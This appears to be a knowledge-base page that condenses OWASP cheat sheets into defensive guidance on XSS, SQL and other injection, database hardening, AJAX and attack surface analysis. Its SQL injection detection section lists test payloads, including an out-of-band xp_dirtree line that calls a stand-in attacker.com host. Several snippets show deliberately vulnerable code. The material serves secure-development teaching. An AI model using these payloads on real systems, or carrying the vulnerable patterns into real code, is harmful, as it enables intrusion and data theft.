---
title: OWASP Cheat Sheets — Developer Quick Reference
type: source-synthesis
tags: [security, owasp, xss, injection, sql, database, attack-surface]
---

# OWASP Cheat Sheets — Developer Quick Reference

Operational implementation guidance distilled from 8 OWASP cheat sheets. Complements [[owasp-web-top10|OWASP Web Top 10 (2021)]] with concrete code-level techniques.

## Provenance
- Theme: web application security implementation
- Registry entry: [[clipping-registry]]
- Raw-source verification: [[../workflows/raw-source-verification|Raw Source Verification]]

## Sources Included
- `Cross Site Scripting Prevention - OWASP Cheat Sheet Series.md`
- `DOM based XSS Prevention - OWASP Cheat Sheet Series.md`
- `Injection Prevention - OWASP Cheat Sheet Series.md`
- `Database Security - OWASP Cheat Sheet Series.md`
- `AJAX Security - OWASP Cheat Sheet Series.md`
- `Attack Surface Analysis - OWASP Cheat Sheet Series.md`
- `Security Terminology - OWASP Cheat Sheet Series.md`
- `What is SQL Injection Tutorial & Examples.md`

---

## 1. Security Terminology (Disambiguation)

Critical distinctions that are frequently confused:

| Term | Definition | Purpose | Reversible | Security Role |
|------|-----------|---------|-----------|---------------|
| **Encoding** | Transform data to different format (Base64, URL%, HTML entity) | Compatibility | Yes | Not a security control by itself |
| **Escaping** | Prefix control chars with escape signal (`\'`, `&lt;`, `\xHH`) | Prevent interpreter misread | Yes | Core injection defense |
| **Sanitization** | Remove/replace dangerous chars or content | Make untrusted input safe | Destructive | Secondary defense; prefer parameterization |
| **Serialization** | Object → byte stream for transport/storage | Data persistence | Yes | Insecure deserialization → RCE |
| **Encryption** | Plaintext → ciphertext with secret key | Confidentiality | Yes (with key) | A02 defense |
| **Hashing** | Data → fixed digest (SHA-256, Argon2) | Integrity + password storage | No | Password storage, integrity checks |
| **Digital Signature** | Asymmetric crypto proof of origin + integrity | Authenticity + non-repudiation | N/A | A08 defense (supply chain) |

---

## 2. XSS Prevention

### Core Principle

"Perfect injection resistance" = ALL variables go through validation, then encoding or sanitization, in the correct context. No single technique is sufficient — use defense in depth.

### Output Encoding by Context

XSS exploits the wrong encoding for a context. Match encoding to rendering context:

| Rendering Context | Location | Encoding to Apply | Safe DOM API |
|-------------------|----------|-------------------|-------------|
| HTML Body | `<div>$var</div>` | HTML entity (`&lt;` `&gt;` `&amp;` `&quot;` `&#x27;`) | `.textContent` |
| HTML Attribute | `<div attr="$var">` | Aggressive HTML entity (`&#xHH;`) + quote the attribute | `.setAttribute(name, val)` |
| JavaScript | `<script>var x='$var'</script>` | Unicode `\uXXXX` or `\xHH` format | — |
| CSS | `style="prop:$var"` | CSS hex `\XX` or `\XXXXXX` | `style.property = x` |
| URL parameter | `href="?q=$var"` | URL percent-encoding `%HH` | `window.encodeURIComponent(x)` |

### Safe Sinks (automatic encoding)
```js
// These are SAFE: treat input as text, not HTML
elem.textContent = userInput;
elem.insertAdjacentText("beforeend", userInput);
elem.setAttribute("class", userInput);
formField.value = userInput;
document.createTextNode(userInput);
window.encodeURIComponent(param);
```

### Dangerous Sinks (never use with untrusted data)
```js
// DANGEROUS: browser parses as HTML/code
elem.innerHTML = userInput;          // XSS via script/event attrs
elem.outerHTML = userInput;
document.write(userInput);
eval(userInput);                     // Code injection
setTimeout(userInput, delay);        // Code injection
element.setAttribute("onclick", userInput);  // Event handler injection
```

### HTML Sanitization (when rich HTML is required)
When users must submit HTML (WYSIWYG editors), encode-only breaks formatting. Use DOMPurify:
```js
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(dirtyHtml);
element.innerHTML = safe;  // Now safe
```
Caveats:
- Re-sanitize if content is modified after sanitization
- Keep DOMPurify patched (browser changes create new bypasses)
- Don't mutate sanitized content before rendering

### DOM XSS (Client-Side Injection)

DOM XSS differs from reflected/stored XSS: the attack is injected **client-side** via JavaScript, not from the server. Attack source: `location.hash`, `document.referrer`, `window.name`, `localStorage`, etc.

Danger: JS execution context with HTML subcontext:
```js
// VULNERABLE
var x = location.hash.slice(1);
document.getElementById("output").innerHTML = x;  // attacker controls hash

// SAFE
document.getElementById("output").textContent = x;
```

### Framework Escape Hatches (high-risk)
Even safe frameworks have unsafe APIs:
- React: `dangerouslySetInnerHTML` — only safe if input is DOMPurify-sanitized first
- Angular: `bypassSecurityTrustAs*` — bypasses all built-in sanitization
- React: `javascript:` URLs not handled safely without explicit validation
- Vue: `v-html` directive — same risk as innerHTML

### Anti-patterns (do NOT use)
1. **Relying solely on CSP** — good defense in depth, but not a primary XSS defense; misconfigurations common, legacy apps break
2. **HTTP interceptors/filters** — can't determine rendering context for each parameter; fails for DOM XSS; causes double-encoding bugs

---

## 3. Injection Prevention

### SQL Injection Deep Dive

**Types**:
- **In-band**: response contains exfiltrated data directly (most common)
- **Inferential/Blind**: no data returned; attacker infers via boolean responses (`OR 1=1` vs `OR 1=2`) or time delays (`SLEEP(10)`)
- **Out-of-band**: data exfiltrated via DNS or HTTP callback (used when blind/in-band not viable)

**Detection** (manual):
- Single quote `'` → look for SQL error or anomalous behavior
- Boolean payloads: `' OR '1'='1` vs `' OR '1'='2`
- Time delay: `'; SELECT SLEEP(10)--` (MySQL), `'; WAITFOR DELAY '0:0:10'--` (MSSQL)
- OAST: `'; exec master..xp_dirtree '//attacker.com/x'--`

**Defense Priority**:
1. **Parameterized queries** (preferred) — separates structure from data at API level
2. **Stored procedures** (safe only if no dynamic SQL inside)
3. **Allowlist input validation** — for table/column names (can't be parameterized)
4. **Escaping** — last resort; fragile, context-dependent

```python
# WRONG: string concat
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

# RIGHT: parameterized
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### Other Injection Vectors

| Type | Context | Defense |
|------|---------|---------|
| LDAP Injection | Auth queries using LDAP | Escape with RFC 2253 function; parameterized LDAP API |
| OS Command Injection | `os.system()`, `subprocess` with shell=True | ProcessBuilder with separate args (no shell concat); never `shell=True` with user input |
| XPath Injection | XML-backed data queries | Parameterized XPath; input validation |
| SSTI | Template engines (Jinja2, Twig, Velocity) | Sandbox environments; never pass user input to `render()`; allowlist template logic |
| Network Protocol Injection | SMTP, IMAP, FTP with user input | Escape or reject special chars; use structured APIs |

### Application-Type Strategy

| App Type | Approach |
|---------|---------|
| New app | Build parameterization in from the start; SAST in CI |
| Open source legacy | Patch/refactor injection points; use ORM layer |
| Closed source legacy | Virtual patching via WAF; DAST scanning to identify vectors |

---

## 4. Database Security

### Network Isolation
- **Never** expose DB port to the public internet
- Bind to localhost or specific app server IP only
- DB in separate DMZ / subnet from app server
- Firewall rules: allow only app server IP on DB port
- Thick clients must connect via API, never direct to DB

### Transport Security
- Require TLS 1.2+ for all DB connections (even internal)
- TLSv1.2+ with AES-GCM or ChaCha20; verify server certificate
- Disable unencrypted fallback in DB config

### Authentication and Credential Storage
- One DB account per application/service
- Never use built-in `root`, `sa`, or `SYS` accounts for app connections
- Credentials: config file outside web root, not in source control, restricted permissions
- Use OS-integrated auth where possible (Windows Auth for MSSQL, native MySQL plugin)

### Least Privilege for DB Accounts
- Grant only `SELECT`, `UPDATE`, `DELETE` — not `DROP`, `CREATE`, `ALTER`
- App account is NOT the DB owner
- Separate accounts for read vs. write paths if practical
- Restrict to specific databases and tables (not `*.*`)
- Avoid DB links / linked servers; if required, minimal cross-DB access only

### Hardening Per DBMS

| DBMS | Key Steps |
|------|----------|
| MySQL/MariaDB | Run `mysql_secure_installation`; disable `FILE` privilege; remove test DBs |
| MSSQL | Disable `xp_cmdshell`, CLR execution, SQL Browser; disable mixed-mode auth |
| All | Apply security patches promptly; transaction logs on separate disk; regular encrypted backups |

---

## 5. Attack Surface Analysis

### What is Attack Surface?

Sum of:
1. All data/command paths **into** and **out of** the app
2. Code protecting those paths (auth, authz, logging, validation, encoding)
3. Valuable data in the app (secrets, PII, business data)
4. Code protecting that data (crypto, access auditing, integrity controls)

### Identification Process

Enumerate entry/exit points by type:
- Login and authentication endpoints
- Admin interfaces
- Search and query forms
- Data entry (CRUD APIs)
- Business workflow interfaces
- External service integrations
- Operational/monitoring APIs
- File upload/download paths
- HTTP headers, cookies, runtime args

Group into buckets by risk profile, purpose, technology. Count each type — don't enumerate every endpoint individually. Focus review on:
- **Internet-facing** endpoints (highest risk)
- **Anonymous/unauthenticated** access paths
- **Admin and privileged** function interfaces
- **Custom APIs and protocols** (highest design-flaw risk)
- **Security code** (auth, crypto, session management)

### Microservice Considerations
- Prioritize components reachable from external traffic
- Components behind load balancers/ingress may auto-scale; track dynamic surface
- Use tools like ThreatMapper or Scope to visualize inter-service attack paths
- Each microservice API is an independent trust boundary — authenticate inter-service calls

### Managing Attack Surface Changes

When making changes, ask:
- Does this add a new entry/exit point? → new risk assessment
- Does this change auth/session management? → high-risk, review required
- Does this add a new user role or privilege level? → verify access model completeness
- Does this touch crypto or key management? → security specialist review

**Risk model types**:
- **Positive (deny by default)**: mistakes in new role definitions are obvious (nothing works until granted)
- **Negative (allow by default)**: must explicitly enumerate all things to deny → error-prone, avoid

---

## 6. AJAX / API Security

### Treat All Data Sources as Untrusted

AJAX applications receive data from multiple sources, all of which are untrusted:
- Server API responses
- Third-party integrations
- localStorage / sessionStorage
- Browser URL fragments (`location.hash`)
- Hidden form fields
- Cached responses

### DOM Manipulation Rules

```js
// SAFE: textContent for plain text
document.getElementById("name").textContent = apiData.name;

// SAFE: DOMPurify for HTML content
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(apiData.html);

// UNSAFE: raw innerHTML with API data
element.innerHTML = apiData.html;  // ← XSS

// UNSAFE: eval or setTimeout with strings
eval(apiData.code);  // ← Code injection
```

### CORS and CSRF
- CORS misconfiguration (A01): restrict `Access-Control-Allow-Origin` to known origins; never `*` for credentialed requests
- CSRF: all state-changing AJAX calls must include CSRF token (same-origin requests can use `SameSite=Strict` cookies as primary defense; token for older browser support)

---

## Synthesis: Developer Checklist by Vulnerability Class

| Risk | Primary Control | Secondary |
|------|----------------|-----------|
| XSS (reflected/stored) | Context-correct output encoding | CSP; framework defaults |
| DOM XSS | Safe sinks (`textContent`) | DOMPurify when HTML required |
| SQL Injection | Parameterized queries | Stored procs; allowlist validation |
| OS Command Injection | Structured subprocess args | Allowlist of allowed commands |
| LDAP Injection | Escape with RFC 2253 | Parameterized LDAP library |
| Database exfil | Least privilege DB account; TLS | Network isolation; parameterized queries |
| Insecure deserialization | Avoid deserializing untrusted data | Integrity signature on serialized objects |
| Attack surface growth | ASA on every significant change | Positive access model; deny by default |

---

## Related
- [[owasp-web-top10|OWASP Web Top 10 (2021)]] — risk taxonomy; this page provides implementation details
- [[owasp-llm-top10|OWASP LLM Top 10 (2025)]] — LLM-layer risks; prompt injection = A03 in LLM form
- [[infrastructure-security|Infrastructure Security]] — network-level controls
- [[../components/policy-gateway|Policy Gateway]] — runtime enforcement layer
- [[network-protocols|Network Protocols]] — TLS 1.3 details for transport security
